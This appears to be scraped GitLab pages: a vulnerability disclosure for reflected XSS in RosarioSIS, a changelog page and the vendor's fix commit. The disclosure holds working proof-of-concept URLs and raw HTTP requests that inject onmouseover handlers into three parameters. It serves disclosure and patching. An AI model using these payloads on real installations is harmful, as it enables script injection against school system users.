=== Content from gitlab.com_b9ec32e0_20250119_123725.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Reflected Cross-Site Scripting in different locations

Reflected Cross-Site Scripting vulnerability in Preferences.php, PrintSchedules.php, and Search.inc.php in RosarioSIS Student Information System < 6.7.2 allows remote attackers to execute arbitrary javascript via embedding javascript in the 'tab', 'include\_inactive', and 'advanced' parameters in a GET request.

| Plugin | README |
| --- | --- |
| Vulnerability type: | Cross-Site Scripting vulnerability (XSS) |
| Vendor of the product(s): | RosarioSIS |
| Affected product(s)/code base: | Tested on version 6.7.2 |
| Has vendor confirmed or acknowledged the vulnerability: | Yes |
| Attack type: | Reflected XSS |
| Impact & Description: | C:L/I:L/A:N |
| Affected component: | modules/Users/Preferences.php, modules/Scheduling/PrintSchedules.php, and modules/Users/Search.inc.php |
| Attack vector(s): | Remote |
| Proof of concept (PoC): | Details below |
| Reference(s): | [#291 (closed)](https://gitlab.com/francoisjacquet/rosariosis/-/issues/291 "Reflected Cross-Site Scripting in different locations") |
| CVSS v3.1 details: | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |

### PoC links:

```
# e1
http://RosarioSIS.edu/Modules.php?modname=Users/Preferences.php&tab=1%22onmouseover%3d%22location=`https://google.com`
# e2
http://RosarioSIS.edu/Modules.php?modname=Users/Preferences.php&tab=1"onmouseover%3d"alert(`xss`)
```

```
# Full redirect injection PoC
GET /Modules.php?modname=Users/Preferences.php&tab=1%22onmouseover%3d%22location=`https://google.com` HTTP/1.1
Host: <IP>
User-Agent: Mozilla/5.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: RosarioSIS=<Cookie>

```

---

"include\_inactive" in modules/Scheduling/PrintSchedules.php has the same issue.

### PoC links:

```
# e1
http://RosarioSIS.edu//Modules.php?modname=Scheduling/PrintSchedules.php&modfunc=&search_modfunc=list&next_modname=Scheduling/PrintSchedules.php&include_inactive=1%22onmouseover%3d%22location=`https://google.com`%22style%3d%22
# e2
http://RosarioSIS.edu/Modules.php?modname=Scheduling/PrintSchedules.php&modfunc=&search_modfunc=list&next_modname=Scheduling/PrintSchedules.php&include_inactive=1%22onmouseover%3d%22alert(1)%22style%3d%22
```

```
# Full redirect injection PoC
GET/Modules.php?modname=Scheduling/PrintSchedules.php&modfunc=&search_modfunc=list&next_modname=Scheduling/PrintSchedules.php&include_inactive=1%22onmouseover%3d%22location=`https://google.com`%22style%3d%22 HTTP/1.1
Host: <IP>
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: RosarioSIS=<Cookie>
Upgrade-Insecure-Requests: 1
If-None-Match: W/e3614b5b6e43dba48c2aa042cbd2d046
Cache-Control: max-age=0

```

---

"advanced" in modules/Users/Search.inc.php has the same issue.

### PoC links:

```
# e1
http://RosarioSIS.edu/Modules.php?modname=Users/User.php&next_modname=Users/User.php&advanced=1%22onmouseover%3d%22alert(`xfr`)%22
# e2
http://RosarioSIS.edu/Modules.php?modname=Users/User.php&next_modname=Users/User.php&advanced=1"onmouseover%3d"location=`https://google.com`"
```

```
# Full redirect injection PoC
GET /Modules.php?modname=Users/User.php&next_modname=Users/User.php&advanced=1"onmouseover%3d"location=`https://google.com`" HTTP/1.1
Host: <IP>
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: RosarioSIS=<Cookie>
Upgrade-Insecure-Requests: 1
If-None-Match: W/e3614b5b6e43dba48c2aa042cbd2d046
Cache-Control: max-age=0

```

### Remediation example:

```
root@bd410a977728:/usr/src/rosariosis# diff ./modules/Users/Preferences.php ./modules/Users/Preferences.php.bk
126,128c126,127
< 	$ttt = $_REQUEST['tab'];
< 	$ttt = htmlspecialchars(strip_tags($ttt));
< 	echo '<form action="Modules.php?modname=' . $_REQUEST['modname'] . '&amp;tab=' . $ttt . '" method="POST">';
---
>
> 	echo '<form action="Modules.php?modname=' . $_REQUEST['modname'] . '&amp;tab=' . $_REQUEST['tab'] . '" method="POST">';
root@bd410a977728:/usr/src/rosariosis#
```

Edited Jul 13, 2020 by [M507](/M507)

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_5456239c_20250119_123724.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [rosariosis](/francoisjacquet/rosariosis/-/tree/mobile)
* [**CHANGES.md**](/francoisjacquet/rosariosis/-/blob/mobile/CHANGES.md)

Find file

[Blame](/francoisjacquet/rosariosis/-/blame/mobile/CHANGES.md)
[Permalink](/francoisjacquet/rosariosis/-/blob/3cf2ab19d77b684601de09c80561d04de0137d4b/CHANGES.md "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* ![François Jacquet's avatar](https://secure.gravatar.com/avatar/7fa9636c4dbc74f01a91731d70fc4b1bb33800783b7667e2f7edb411311bc4f3?s=64&d=identicon "François Jacquet")

  Jan 16, 2025

  [f040574a](/francoisjacquet/rosariosis/-/commit/f040574a77dfd91dbe677f75825829d1e1f14280)
  [Fix PHP < 8.0 warning Wrong parameter count for number\_format()](/francoisjacquet/rosariosis/-/commit/f040574a77dfd91dbe677f75825829d1e1f14280)
  ·
  f040574a

  François Jacquet authored Jan 16, 2025

  f040574a

  [Fix PHP < 8.0 warning Wrong parameter count for number\_format()](/francoisjacquet/rosariosis/-/commit/f040574a77dfd91dbe677f75825829d1e1f14280)
  François Jacquet authored Jan 16, 2025

To find the state of this project's repository at the time of any of these versions, check out [the tags](/francoisjacquet/rosariosis/-/tags).

Loading



=== Content from gitlab.com_73c89470_20250119_123724.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

**Commit
c4a69486**

authored
Jul 14, 2020
by
**![François Jacquet's avatar](https://secure.gravatar.com/avatar/7fa9636c4dbc74f01a91731d70fc4b1bb33800783b7667e2f7edb411311bc4f3?s=48&d=identicon "François Jacquet")
François Jacquet**

[Browse files](/francoisjacquet/rosariosis/-/tree/c4a694860b50c4aa5c67d6568f7d0613fef1a30d)

### Fix [#291](/francoisjacquet/rosariosis/-/issues/291 "Reflected Cross-Site Scripting in different locations") XSS Use URLEscape() for links href

parent
[a5c2e3f8](/francoisjacquet/rosariosis/-/commit/a5c2e3f8eeb7d1c6664ca772bcd97ca97cf6eeef)

Loading

Loading

Loading

* [Changes
  1](/francoisjacquet/rosariosis/-/commit/c4a694860b50c4aa5c67d6568f7d0613fef1a30d)

[Hide whitespace changes](/francoisjacquet/rosariosis/-/commit/c4a694860b50c4aa5c67d6568f7d0613fef1a30d?action=show&controller=projects%2Fcommit&id=c4a694860b50c4aa5c67d6568f7d0613fef1a30d&namespace_id=francoisjacquet&project_id=rosariosis&w=1)
[Inline](/francoisjacquet/rosariosis/-/commit/c4a694860b50c4aa5c67d6568f7d0613fef1a30d?view=inline)
[Side-by-side](/francoisjacquet/rosariosis/-/commit/c4a694860b50c4aa5c67d6568f7d0613fef1a30d?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment


